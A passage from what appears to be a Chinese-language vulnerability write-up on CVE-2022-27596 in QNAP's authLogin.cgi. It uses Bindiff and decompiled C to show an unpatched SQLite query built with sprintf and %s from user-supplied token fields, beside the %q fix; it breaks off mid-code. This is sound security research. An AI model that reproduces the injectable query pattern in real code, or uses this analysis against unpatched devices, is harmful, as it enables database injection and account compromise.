                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-1.png"
                     
                ></p>
<p>使用 Bindiff 比较两个版本程序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-2.png"
                     
                ></p>
<p>发生变化的仅有两个函数，第一个函数实际逻辑没有变化，我们重点关注第二个函数。</p>
<p>sub_408bb8 是 authLogin.cgi 的主要处理函数，限于篇幅这里不列出完整代码。两个版本的差异主要在于一些字符串发生了变化：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2194</span></span><br><span class="line"><span class="keyword">if</span> ( ((v39 + <span class="number">2</span>) &amp; <span class="number">0xFFFFFFFD</span>) == <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    sub_411B58(<span class="number">1LL</span>);</span><br><span class="line">    v55 = sub_40F730(<span class="string">&quot;SMBFW&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    v56 = sub_40CD08(v55);</span><br><span class="line">    sub_40CE20(v56);</span><br><span class="line">    v57 = Is_2SV_Enable(byte_43AB0A);</span><br><span class="line">    v58 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v57 )</span><br><span class="line">        v58 = Is_User_Group_Force_2SV_Effect(byte_43AB0A) != <span class="number">0</span>;</span><br><span class="line">    v40 = sub_41E000;</span><br><span class="line">    v41 = <span class="string">&quot;NVRVER&quot;</span>;</span><br><span class="line">    v43 = sub_41E000;</span><br><span class="line">    v59 = sub_40F730(<span class="string">&quot;force_2sv&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%d&quot;</span>, v58);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_94;</span><br><span class="line">&#125;</span><br><span class="line">v41 = <span class="string">&quot;NVRVER&quot;</span>;</span><br><span class="line">v40 = sub_41E000;</span><br><span class="line">v44 = sub_411B58(<span class="number">0LL</span>);</span><br><span class="line">v43 = sub_41E000;</span><br><span class="line">LABEL_65:</span><br><span class="line">v45 = sub_40D038(v44);</span><br><span class="line">sub_40F730(<span class="string">&quot;ts&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%lld&quot;</span>, v45);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2234</span></span><br><span class="line"><span class="keyword">if</span> ( ((v39 + <span class="number">2</span>) &amp; <span class="number">0xFFFFFFFD</span>) == <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v43 = <span class="string">&quot;nagement&quot;</span>;</span><br><span class="line">    sub_411C30(<span class="number">1LL</span>);</span><br><span class="line">    v52 = sub_40F808(<span class="string">&quot;SMBFW&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    v53 = sub_40CDE0(v52);</span><br><span class="line">    sub_40CEF8(v53);</span><br><span class="line">    v54 = Is_2SV_Enable(byte_43ABEA);</span><br><span class="line">    v55 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v54 )</span><br><span class="line">        v55 = Is_User_Group_Force_2SV_Effect(byte_43ABEA) != <span class="number">0</span>;</span><br><span class="line">    v40 = sub_41E000;</span><br><span class="line">    v41 = <span class="string">&quot;qdownload&quot;</span>;</span><br><span class="line">    sub_40F808(<span class="string">&quot;force_2sv&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%d&quot;</span>, v55);</span><br><span class="line">    v56 = <span class="number">4317184LL</span>;</span><br><span class="line">    v215 = sub_41E000;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_95;</span><br><span class="line">&#125;</span><br><span class="line">v41 = <span class="string">&quot;qdownload&quot;</span>;</span><br><span class="line">v40 = sub_41E000;</span><br><span class="line">v43 = <span class="string">&quot;Share Management&quot;</span> + <span class="number">8</span>;</span><br><span class="line">sub_411C30(<span class="number">0LL</span>);</span><br><span class="line">v44 = <span class="number">4317184LL</span>;</span><br><span class="line">v215 = sub_41E000;</span><br><span class="line">LABEL_65:</span><br><span class="line">v45 = sub_40D110(v44);</span><br><span class="line">sub_40F808(<span class="string">&quot;ts&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%lld&quot;</span>, v45);</span><br></pre></td></tr></table></figure></div>

<p>除字符串之外代码逻辑变化较小，且没有发现 SQL 相关操作。我们猜测主要漏洞可能位于 authLogin.cgi 使用的 so 库中。</p>
<p>对比两个版本的 so 库目录，找到一些存在差异的文件，通过搜索函数可以找到关键文件 libuLinux_NAS.so.0.0，同样使用 bindiff 比较：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-3.png"
                     
                ></p>
<p>逐个分析，最终找到关键函数 sub_63D58(2194 版本)，列举两个版本代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2194</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_63D58</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">int</span> a3, _BYTE *a4, <span class="type">int</span> a5, <span class="type">int</span> a6, __int64 a7, __int64 data, __int64 a9)</span></span><br><span class="line">&#123;</span><br><span class="line">  v35 = <span class="number">0LL</span>;</span><br><span class="line">  v38 = <span class="number">0LL</span>;</span><br><span class="line">  v37 = <span class="number">0LL</span>;</span><br><span class="line">  v36 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v32, <span class="number">0</span>, <span class="keyword">sizeof</span>(v32));</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt; <span class="number">-1</span> || a3 &gt; <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a5 &lt; <span class="number">0</span> || a6 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a4 &amp;&amp; *a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">        v38 = sqlite3_mprintf(<span class="string">&quot;ORDER BY %q DESC &quot;</span>, a4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v38 = sqlite3_mprintf(byte_7D820);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v38 = sqlite3_mprintf(<span class="string">&quot;ORDER BY %q ASC &quot;</span>, a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( data )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v10], <span class="string">&quot;AND client_id = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">24</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v11], <span class="string">&quot;AND token = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">24</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v12], <span class="string">&quot;AND client_agent = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">32</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">40</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v13], <span class="string">&quot;AND client_app = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">40</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">48</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v14], <span class="string">&quot;AND uid = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">48</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v15], <span class="string">&quot;AND user = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">56</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">64</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v16], <span class="string">&quot;AND create_time = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">64</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">68</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v17], <span class="string">&quot;AND duration = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">68</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">72</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v18], <span class="string">&quot;AND last_access = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">72</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">76</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v19], <span class="string">&quot;AND type = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">76</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">80</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v20], <span class="string">&quot;AND extra_data = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">80</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v32[v21], <span class="string">&quot;AND duration != -1 AND (create_time+duration) &lt; %ld &quot;</span>, a7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v32[<span class="number">0</span>] )</span><br><span class="line">    v36 = sqlite3_mprintf(<span class="string">&quot;WHERE %s&quot;</span>, &amp;v32[<span class="number">4</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v36 = sqlite3_mprintf(byte_7D820);</span><br><span class="line">  <span class="keyword">if</span> ( a5 || a6 )</span><br><span class="line">    v37 = sqlite3_mprintf(<span class="string">&quot;LIMIT %d OFFSET %d&quot;</span>, a6, a5);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v37 = sqlite3_mprintf(byte_7D820);</span><br><span class="line">  v35 = sqlite3_mprintf(<span class="string">&quot;SELECT * FROM QTOKEN %s %s %s;&quot;</span>, v36, v38, v37);</span><br><span class="line">  v34 = sqlite3_open(a2, &amp;v33);</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_free(v35);</span><br><span class="line">    sqlite3_free(v38);</span><br><span class="line">    sqlite3_free(v37);</span><br><span class="line">    v22 = sqlite3_errmsg(v33);</span><br><span class="line">    sub_62648(<span class="string">&quot;open %s failed! (%d, %s)\n&quot;</span>, a2, v34, v22);</span><br><span class="line">    result = <span class="number">4294967276LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_busy_timeout(v33, <span class="number">60000LL</span>);</span><br><span class="line">    v34 = sqlite3_exec(v33, v35, a1, a9, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v34 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j_check_db(g_dbfile) )</span><br><span class="line">        j_qtoken_db_init();</span><br><span class="line">      v23 = sqlite3_errmsg(v33);</span><br><span class="line">      sub_62648(<span class="string">&quot;query failed! (%d, %s)\n&quot;</span>, v34, v23);</span><br><span class="line">    &#125;</span><br><span class="line">    sqlite3_close(v33);</span><br><span class="line">    sqlite3_free(v35);</span><br><span class="line">    sqlite3_free(v38);</span><br><span class="line">    sqlite3_free(v37);</span><br><span class="line">    <span class="keyword">if</span> ( v34 )</span><br><span class="line">      result = <span class="number">4294967272LL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2234</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_649A4</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">int</span> a3, _BYTE *a4, <span class="type">int</span> a5, <span class="type">int</span> a6, __int64 a7, __int64 a8, __int64 a9)</span></span><br><span class="line">&#123;</span><br><span class="line">  v41 = <span class="number">0LL</span>;</span><br><span class="line">  v44 = <span class="number">0LL</span>;</span><br><span class="line">  v43 = <span class="number">0LL</span>;</span><br><span class="line">  v42 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v38, <span class="number">0</span>, <span class="keyword">sizeof</span>(v38));</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt; <span class="number">-1</span> || a3 &gt; <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a5 &lt; <span class="number">0</span> || a6 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a4 &amp;&amp; *a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">        v44 = sqlite3_mprintf(<span class="string">&quot;ORDER BY %q DESC &quot;</span>, a4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v44 = sqlite3_mprintf(byte_7E500);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v44 = sqlite3_mprintf(<span class="string">&quot;ORDER BY %q ASC &quot;</span>, a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v11 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v10, &amp;v38[v11], <span class="string">&quot;AND client_id = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">24</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v13 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v12, &amp;v38[v13], <span class="string">&quot;AND token = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">24</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v15 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v14, &amp;v38[v15], <span class="string">&quot;AND client_agent = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">32</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">40</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v17 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v16, &amp;v38[v17], <span class="string">&quot;AND client_app = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">40</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">48</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v18], <span class="string">&quot;AND uid = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">48</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v20 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v19, &amp;v38[v20], <span class="string">&quot;AND user = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">56</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">64</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v21], <span class="string">&quot;AND create_time = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">64</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">68</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v22], <span class="string">&quot;AND duration = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">68</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">72</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v23], <span class="string">&quot;AND last_access = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">72</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">76</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v24], <span class="string">&quot;AND type = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">76</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">80</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v26 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v25, &amp;v38[v26], <span class="string">&quot;AND extra_data = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">80</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v38[v27], <span class="string">&quot;AND duration != -1 AND (create_time+duration) &lt; %ld &quot;</span>, a7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v38[<span class="number">0</span>] )</span><br><span class="line">    v42 = sqlite3_mprintf(<span class="string">&quot;WHERE %s&quot;</span>, &amp;v38[<span class="number">4</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v42 = sqlite3_mprintf(byte_7E500);</span><br><span class="line">  <span class="keyword">if</span> ( a5 || a6 )</span><br><span class="line">    v43 = sqlite3_mprintf(<span class="string">&quot;LIMIT %d OFFSET %d&quot;</span>, a6, a5);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v43 = sqlite3_mprintf(byte_7E500);</span><br><span class="line">  v41 = sqlite3_mprintf(<span class="string">&quot;SELECT * FROM QTOKEN %s %s %s;&quot;</span>, v42, v44, v43);</span><br><span class="line">  v40 = sqlite3_open(a2, &amp;v39);</span><br><span class="line">  <span class="keyword">if</span> ( v40 )</span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_free(v41);</span><br><span class="line">    sqlite3_free(v44);</span><br><span class="line">    sqlite3_free(v43);</span><br><span class="line">    v28 = sqlite3_errmsg(v39);</span><br><span class="line">    sub_63294(<span class="string">&quot;open %s failed! (%d, %s)\n&quot;</span>, a2, v40, v28);</span><br><span class="line">    result = <span class="number">4294967276LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_busy_timeout(v39, <span class="number">60000LL</span>);</span><br><span class="line">    v40 = sqlite3_exec(v39, v41, a1, a9, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v40 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j_check_db(g_dbfile) )</span><br><span class="line">        j_qtoken_db_init();</span><br><span class="line">      v29 = sqlite3_errmsg(v39);</span><br><span class="line">      sub_63294(<span class="string">&quot;query failed! (%d, %s)\n&quot;</span>, v40, v29);</span><br><span class="line">    &#125;</span><br><span class="line">    sqlite3_close(v39);</span><br><span class="line">    sqlite3_free(v41);</span><br><span class="line">    sqlite3_free(v44);</span><br><span class="line">    sqlite3_free(v43);</span><br><span class="line">    <span class="keyword">if</span> ( v40 )</span><br><span class="line">      result = <span class="number">4294967272LL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数使用一些参数拼接 sqlite 查询语句并执行，不难发现旧版本中在拼接 SQL 语句时对字符串使用了 %s，而没有使用安全的 %q。</p>
<p>至此可以猜测此函数为最终漏洞点，接下来通过交叉引用尝试从 authLogin.cgi 定位相关代码。</p>
<p>在 authLogin.cgi 的处理逻辑中，当用户传入名为 app 的参数时，会进入 app_handler 函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">app_handler</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v76[<span class="number">8</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">9</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">10</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">11</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">5</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">6</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">7</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">12</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">13</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v77 = <span class="number">0</span>;</span><br><span class="line">  v73 = <span class="number">0</span>;</span><br><span class="line">  v76[<span class="number">14</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">15</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v72 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v84, <span class="number">0</span>, <span class="keyword">sizeof</span>(v84));</span><br><span class="line">  <span class="built_in">memset</span>(v78, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v79, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">  v75 = <span class="number">0</span>;</span><br><span class="line">  v71 = <span class="number">0LL</span>;</span><br><span class="line">  v74[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v74[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v74[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v74[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v2 = CGI_Find_Parameter(a1, <span class="string">&quot;app&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    app = *(v2 + <span class="number">8</span>);</span><br><span class="line">    v4 = CGI_Find_Parameter(a1, <span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_3:</span><br><span class="line">      v68 = *(v4 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    app = <span class="number">0LL</span>;</span><br><span class="line">    v4 = CGI_Find_Parameter(a1, <span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">  &#125;</span><br><span class="line">  v68 = <span class="number">0LL</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">  v5 = CGI_Find_Parameter(a1, <span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v67 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(v76, *(v5 + <span class="number">8</span>), <span class="number">0x81</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v67 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = CGI_Find_Parameter(a1, <span class="string">&quot;remme&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v66 = strtol(*(v6 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    v7 = CGI_Find_Parameter(a1, <span class="string">&quot;app_token&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">      app_token = *(v7 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v66 = <span class="number">0</span>;</span><br><span class="line">    v7 = CGI_Find_Parameter(a1, <span class="string">&quot;app_token&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      <span class="keyword">goto</span> 